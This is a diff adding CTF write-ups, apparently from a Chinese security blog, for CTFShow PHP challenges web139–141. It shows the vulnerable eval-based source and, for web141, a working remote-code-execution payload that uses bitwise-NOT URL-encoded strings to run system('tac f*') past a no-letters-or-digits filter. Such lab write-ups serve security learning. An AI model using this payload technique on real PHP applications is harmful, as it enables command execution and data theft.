@@ -1154,6 +1154,50 @@
 <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post:</span></span><br><span class="line">ctfshow[<span class="number">0</span>]=ctfshow&amp;ctfshow[<span class="number">1</span>]=getFlag</span><br></pre></td></tr></table></figure>
 
 <p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web138_1.png"></p>
+<h2 id="web139"><a href="#web139" class="headerlink" title="web139"></a>web139</h2><p>先放着</p>
+<h2 id="web140"><a href="#web140" class="headerlink" title="web140"></a>web140</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 12:39:25</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$f1</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f1&#x27;</span>];</span><br><span class="line">    <span class="variable">$f2</span> = (<span class="keyword">String</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;f2&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^[a-z0-9]+$/&#x27;</span>, <span class="variable">$f2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> = <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$f1</span>(<span class="subst">$f2</span>());&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(intval(<span class="variable">$code</span>) == <span class="string">&#x27;ctfshow&#x27;</span>)&#123;</span><br><span class="line">                <span class="keyword">echo</span> file_get_contents(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>首先阅读程序上下文 POST 两个参数必须数字或字母组成，且  $f1($f2()); 注意括号 变量后面有括号表示函数了。随便输入几个函数</li>
+<li>intval() 如果参数为 字母组成，它的返回值为 0 。 </li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// post:</span></span><br><span class="line">f1=md5&amp;f2=md5</span><br><span class="line">f1=usleep&amp;f2=usleep</span><br><span class="line">……</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web140.png"></p>
+<h2 id="web141"><a href="#web141" class="headerlink" title="web141"></a>web141</h2><p>源码:</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-10-13 11:25:09</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-10-17 19:28:09</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (<span class="keyword">String</span>)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(is_numeric(<span class="variable">$v1</span>) &amp;&amp; is_numeric(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><strong>分析:</strong></p>
+<ul>
+<li>首先阅读程序上下文，发现了 正则匹配： /^\W+$/     \W 匹配<strong>非字母，数字，下划线</strong>等价于 ‘[A-Za-z0-9_]’ ，注意 “非” 这个字，就是不匹配 字母，数字，下划线。</li>
+<li>is_numeric（） 检测变量是否为数字或数字字符串 。那么 v1 ， v2 得是数字形式。</li>
+<li>需要构造绕过 字母，数字，下划线的 字符。参考了 羽师傅的文章。</li>
+<li>eval(“return $v1$v3$v2”), return 返回并结束程序，而 v1, v2 为数字，那么 v3 就是命令执行了。所以要让 v3 = 无字母数字下划线的 RCE。需要注意 v1, v2,v3的位置。来本地测试一下。</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141.png"></p>
+<ul>
+<li>注意图中 ，分别为 v1,v2,v3 传入参数: 1,2,3 那么 $v1$v3$v2=123 ， 没有结果，再看一个示例:</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_1.png"></p>
+<ul>
+<li>如图所示，将 v3 更改为了 - (减号) 可得到结果。类推： *， / ，% ，^ 等都行，但是 + 不行。 此时可以证明 PHP 中 数字可以和命令进行运算。再看一个示例：</li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_2.png"></p>
+<ul>
+<li>如图所示，将 phpinfo() 与 数字进行了运算 ： 1-phpinfo()*2 , 仍然能得到 php 的版信息。再看一个示例: </li>
+</ul>
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_3.png"></p>
+<ul>
+<li>如图所示: 在上一步上依此类推可以构造出 system(“tac f*”); 而在本题当中 需要 将 system(“tac f*”) 此命令编程 无字母数字的 RCE： (<del>%8C%86%8C%8B%9A%92)(</del>%8B%9E%9C%DF%99%D5)</li>
+</ul>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?v1=<span class="number">1</span>&amp;v2=<span class="number">2</span>&amp;v3=<span class="number">1</span>-(~%<span class="number">8</span>C%<span class="number">86</span>%<span class="number">8</span>C%<span class="number">8</span>B%<span class="number">9</span>A%<span class="number">92</span>)(~%<span class="number">8</span>B%<span class="number">9</span>E%<span class="number">9</span>C%DF%<span class="number">99</span>%D5)*<span class="number">2</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2021/07/26/CTFShow-PHP%E7%89%B9%E6%80%A7/web141_4.png"></p>
+<ul>
+<li>得到 了 flag , 这题的 重点 在于 无字母数字字符的构造。</li>
+</ul>
 ]]></content>
       <categories>
         <category>CTF笔记</category>
